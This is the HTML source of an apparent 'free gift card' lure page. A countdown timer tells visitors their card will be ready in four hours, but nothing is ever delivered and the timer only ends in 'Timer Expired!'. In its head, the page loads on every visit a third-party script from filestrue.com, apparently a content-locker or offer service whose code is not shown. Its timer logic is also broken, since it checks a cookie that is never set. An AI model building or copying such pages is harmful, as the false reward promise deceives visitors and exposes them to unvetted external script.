
<!DOCTYPE html>
<html lang="en">
<head>
<script type="text/javascript" src="https://filestrue.com/script_include.php?id=1535203"></script>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta name="description" content="Claim your free gift card and enjoy our special promotion. Get started now to receive your gift card within 4 hours. Explore our other tools and services." />
      <title>Gift Card Offer | Get Free Gift Cards - Your Brand</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f2f2f2;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        

        .gift-card {
            background-color: #fff;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
            padding: 20px;
            text-align: center;
            
              max-width: 400px; /* Limit the width of the gift card container */
               margin: 0 auto; /* Center align the gift card */
        }
        .gift-card img {
            max-width: 100%;
            height: auto;
        }
        .timer {
            font-size: 24px;
            color: #333;
        }
        .start-button {
            background-color: #4CAF50;
            color: #fff;
            border: none;
            border-radius: 5px;
            padding: 10px 20px;
            font-size: 16px;
            cursor: pointer;
        }
        
    .gift-card p {
        font-size: 16px; /* Adjust the font size */
        line-height: 1.5; /* Adjust the line height for better readability */
        color: #555; /* Change the text color */
        margin: 10px 0; /* Add some margin for spacing between paragraphs */
    }

    /* Adjust font size for smaller screens */
@media screen and (max-width: 480px) {
    .gift-card h1 {
        font-size: 24px;
    }
   
    .gift-card .start-button {
        font-size: 14px;
    }
}


   /* Modal styles */
.modal {
    display: none; /* Hide the modal by default */
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background-color: rgba(0, 0, 0, 0.7);
    z-index: 1;
    overflow: auto;
}

.modal-content {
    background-color: #fefefe;
    margin: 15% auto;
    padding: 20px;
    border: 1px solid #888;
    border-radius: 5px;
    max-width: 400px;
    text-align: center;
    position: relative;
}

.close {
    position: absolute;
    top: 0;
    right: 0;
    padding: 10px;
    cursor: pointer;
}



</style>

</head>
<body>
    <div class="gift-card">
        <h1>Gift Card</h1>
        <img src="./img/on_pge.jfif" alt="Gift Card Image">
        <p>Click the button to initiate time tracking.</p>
        <p>Due to a high volume of participants in our gift card promotion, please allow up to 4 hours for your gift card reward to be made available here. Feel free to return in the next 4 hours. </p>
        <button class="start-button" id="startTimer">Start Timer</button>
              

        <div id="myModal" class="modal">
            <div class="modal-content">
                <span class="close">&times;</span>
                <p>Timer started successfully! Your gift card will be available in 4 hours.</p>
            </div>
        </div>
        
        <p class="timer" id="timer">
            <!-- Timer will be displayed here -->
        </p>
        
    </div>
    <script>
        // Function to show the modal
function showModal() {
var modal = document.getElementById("myModal");
modal.style.display = "block";

// Close the modal when the close button is clicked
var closeButton = modal.querySelector(".close");
closeButton.onclick = function () {
    modal.style.display = "none";
};
}

// Function to start the timer
function startTimer() {
var startTime = new Date().getTime();
var fourHoursLater = new Date(startTime + 4 * 60 * 60 * 1000);

// Show the modal
showModal();

// Store the start time in local storage
localStorage.setItem("startTime", startTime);

var timerInterval = setInterval(function () {
    var currentTime = new Date().getTime();
    var timeRemaining = fourHoursLater - currentTime;

    if (timeRemaining <= 0) {
        clearInterval(timerInterval);
        document.getElementById("timer").textContent = "Timer Expired!";
    } else {
        var hours = Math.floor(timeRemaining / (60 * 60 * 1000));
        var minutes = Math.floor((timeRemaining % (60 * 60 * 1000)) / (60 * 1000));
        var seconds = Math.floor((timeRemaining % (60 * 1000)) / 1000);

        document.getElementById("timer").textContent = `${hours}h ${minutes}m ${seconds}s`;
    }
}, 1000);
}

   // Check if a timer is already running by checking the cookie
function checkTimer() {
    var cookies = document.cookie.split(';');
    for (var i = 0; i < cookies.length; i++) {
        var cookie = cookies[i].trim();
        if (cookie.startsWith("startTime=")) {
            var startTime = parseInt(cookie.substring("startTime=".length), 10);
            var currentTime = new Date().getTime();
            var timeElapsed = currentTime - startTime;

            if (timeElapsed >= 4 * 60 * 60 * 1000) {
                document.getElementById("timer").textContent = "Timer Expired!";
            } else {
                startTimer(); // Continue the timer
            }
            break;
        }
    }
}


// Add click event listener to the start button
document.getElementById("startTimer").addEventListener("click", startTimer);

</script>
</body>
</html>
